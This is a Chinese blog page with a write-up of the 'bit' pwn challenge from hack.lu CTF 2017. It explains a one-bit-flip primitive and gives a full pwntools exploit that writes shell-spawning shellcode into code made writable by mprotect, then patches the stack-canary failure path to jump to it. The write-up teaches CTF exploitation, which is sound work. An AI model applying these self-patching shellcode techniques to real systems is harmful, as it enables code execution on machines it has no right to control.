@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="一些pwn题的题解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hacklu ctf 2017 pwn writeup">
+<meta property="og:url" content="https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="一些pwn题的题解">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-01.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-02.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-03.jpg">
+<meta property="article:published_time" content="2017-10-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-10-28T13:27:58.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="hacklu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-01.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>hacklu ctf 2017 pwn writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017-Kanxue-TSRC-fall-race.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/ropemporium-all-writeup.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&text=hacklu ctf 2017 pwn writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&title=hacklu ctf 2017 pwn writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&is_video=false&description=hacklu ctf 2017 pwn writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hacklu ctf 2017 pwn writeup&body=Check out this article: https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&title=hacklu ctf 2017 pwn writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&title=hacklu ctf 2017 pwn writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&title=hacklu ctf 2017 pwn writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&title=hacklu ctf 2017 pwn writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&name=hacklu ctf 2017 pwn writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&t=hacklu ctf 2017 pwn writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bit"><span class="toc-number">1.</span> <span class="toc-text">bit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-%E7%BC%96%E5%86%99"><span class="toc-number">1.1.</span> <span class="toc-text">exploit 编写</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        hacklu ctf 2017 pwn writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-10-23T16:00:00.000Z" itemprop="datePublished">2017-10-24</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/hacklu/" rel="tag">hacklu</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="bit"><a href="#bit" class="headerlink" title="bit"></a>bit</h2><p>通过静态分析我们得到一些结论</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-01.jpg"></p>
+<p>输入的参数以<code>%lx:%u</code>组成，即由16进制数和无符号整型组成，中间以冒号分隔</p>
+<p>此外，在静态分析的过程中我们会发现程序调用了<code>mprotect</code>函数，这会意味着,我们将由条件去修改内存的权限（也许是不可执行修改为可执行）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text:00000000004006A7 loc_4006A7:                             ; CODE XREF: main+68↑j</span><br><span class="line">.text:00000000004006A7                 mov     rax, cs:qword_601018</span><br><span class="line">.text:00000000004006AE                 and     rax, 0FFFFFFFFFFFF1000h</span><br><span class="line">.text:00000000004006B4                 mov     edx, 7          ; prot</span><br><span class="line">.text:00000000004006B9                 mov     esi, 1000h      ; len</span><br><span class="line">.text:00000000004006BE                 mov     rdi, rax        ; addr</span><br><span class="line">.text:00000000004006C1                 call    _mprotect</span><br></pre></td></tr></table></figure>
+<p>当我们继续往下分析当时候，我们会发现一个算是逻辑漏洞当点，就是，程序会去修改已经存在于指定的地址中的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006D7                 mov     rdx, cs:qword_601018</span><br><span class="line">.text:00000000004006DE                 movzx   edx, byte ptr [rdx]</span><br><span class="line">.text:00000000004006E1                 mov     ecx, cs:dword_601020</span><br><span class="line">.text:00000000004006E7                 mov     edi, 1</span><br><span class="line">.text:00000000004006EC                 shl     edi, cl</span><br><span class="line">.text:00000000004006EE                 mov     ecx, edi</span><br><span class="line">.text:00000000004006F0                 xor     edx, ecx</span><br><span class="line">.text:00000000004006F2                 mov     [rax], dl</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-02.jpg"></p>
+<p>程序在0x400721会由一个canary 检查，检查程序是否发生栈溢出<br>通过<code>checksec</code>的检查，我们也会发现他开启了canary，nx，full relr0防护</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/media/psf/Home/MyCTF/hacklu/pwn/bit/bit&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>那么我们如何去getshell呢？<br>题目的关键还是在那个指定地址，然后修改一位的地方，其实思路也是很简单，我们去注入shellcode在一个指定的地址，然后不断的去修改指定地址的值，直到修改到shellcode的地址，由于mprotect的作用，我们就可以获取一个shell</p>
+<h3 id="exploit-编写"><a href="#exploit-编写" class="headerlink" title="exploit 编写"></a>exploit 编写</h3><p>第一步<br>思路，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400721                 xor     rsi, fs:28h</span><br><span class="line">.text:000000000040072A                 jz      short locret_400731</span><br><span class="line">.text:000000000040072C                 call    ___stack_chk_fail</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们注意到40072a这个地方有个跳转，我们可以进行去patch，让他不断到跳转到main函数去</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hackluctf-bit-03.jpg"></p>
+<p><code>io.sendline(&quot;0x40072b:4&quot;)</code></p>
+<p>第二步<br>当我们这个时候，我们已经能够成功不断当返回到main函数之后，我们需要在一个地方写入shellcode</p>
+<p>我们发现<code>0x400570</code>是个不错到选择，因为这快基本不会被调用到</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">start = <span class="number">0x00400570</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> shellcode:</span><br><span class="line">    write_value(io, elf, start, c)</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>紧接着，我们只需要重新修改40072c到shellcdoe地址就可以</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new_call=<span class="string">&quot;\xe8\x3f\xfe\xff\xff&quot;</span>   <span class="comment"># call 0x400570 (shellcode)</span></span><br><span class="line">start = <span class="number">0x0040072c</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> new_call:</span><br><span class="line">    write_value(io, elf, start, c)</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>最后伪造canary到验证<br><code>io.sendline(0x400720:0)</code></p>
+<p>完整exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_value</span>(<span class="params">io, elf, addr, new</span>):</span></span><br><span class="line">    <span class="comment"># write new bytes at addr address.</span></span><br><span class="line">    new = int(new.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">    initial = elf.data[addr - <span class="number">0x400000</span>]</span><br><span class="line">    initial = int(initial.encode(<span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;At &#123;&#125;, replace &#123;&#125; with &#123;&#125;&quot;</span>.format(hex(addr), hex(initial), hex(new)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (initial &amp; (<span class="number">1</span>&lt;&lt;bit)) != (new &amp; (<span class="number">1</span>&lt;&lt;bit)):</span><br><span class="line">            payload = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.format(hex(addr), bit)</span><br><span class="line">            io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    io = process(<span class="string">&#x27;./bit&#x27;</span>)</span><br><span class="line">    <span class="comment">#io = remote(&#x27;flatearth.fluxfingers.net&#x27;, 1744)</span></span><br><span class="line">    gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            break *0x400713</span></span><br><span class="line"><span class="string">            break *0x40072a</span></span><br><span class="line"><span class="string">            break *0x400681</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./bit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    <span class="comment"># patch jmp to loop on main()</span></span><br><span class="line">    <span class="comment">#   0x0040072a      7405           je 0x400731</span></span><br><span class="line">    io.sendline(<span class="string">&quot;0x40072b:4&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    <span class="comment"># write shellcode at 0x00400570</span></span><br><span class="line">    context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">    shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">    raw_input(<span class="string">&quot;make shellcode&quot;</span>)</span><br><span class="line">    start = <span class="number">0x00400570</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> shellcode:</span><br><span class="line">        write_value(io, elf, start, c)</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line">    raw_input(<span class="string">&quot;loop~~~~&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># patch callq sym.imp.__stack_chk_fail()</span></span><br><span class="line">    <span class="comment">#   0x0040072c      e8bffdffff     callq sym.imp.__stack_chk_fail</span></span><br><span class="line">    <span class="comment"># Instead we want: call 0xfffffe44  (0xfffffe44 = -444 =&gt; 0x400570)</span></span><br><span class="line">    <span class="comment">#   root@pwn:/# rasm2 &#x27;call 0xfffffe44&#x27;</span></span><br><span class="line">    <span class="comment">#   e83ffeffff</span></span><br><span class="line">    new_call=<span class="string">&quot;\xe8\x3f\xfe\xff\xff&quot;</span></span><br><span class="line">    start = <span class="number">0x0040072c</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> new_call:</span><br><span class="line">        write_value(io, elf, start, c)</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># finally corrupt the cookie!</span></span><br><span class="line">    <span class="comment">#   0x0040071d      488b75f8       movq local_8h, %rsi</span></span><br><span class="line">    <span class="comment">#   0x00400721      644833342528.  xorq %fs:0x28, %rsi</span></span><br><span class="line">    <span class="comment">#   byte:0xf8 value:0 result:0xf9</span></span><br><span class="line">    <span class="comment"># Instead we want:</span></span><br><span class="line">    <span class="comment">#   movq local_7h, %rsi</span></span><br><span class="line">    io.sendline(<span class="string">&quot;0x400720:0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shell!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#bit"><span class="toc-number">1.</span> <span class="toc-text">bit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-%E7%BC%96%E5%86%99"><span class="toc-number">1.1.</span> <span class="toc-text">exploit 编写</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&text=hacklu ctf 2017 pwn writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&title=hacklu ctf 2017 pwn writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&is_video=false&description=hacklu ctf 2017 pwn writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hacklu ctf 2017 pwn writeup&body=Check out this article: https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&title=hacklu ctf 2017 pwn writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&title=hacklu ctf 2017 pwn writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&title=hacklu ctf 2017 pwn writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&title=hacklu ctf 2017 pwn writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&name=hacklu ctf 2017 pwn writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-hacklu-ctf-pwn-writeup.html&t=hacklu ctf 2017 pwn writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
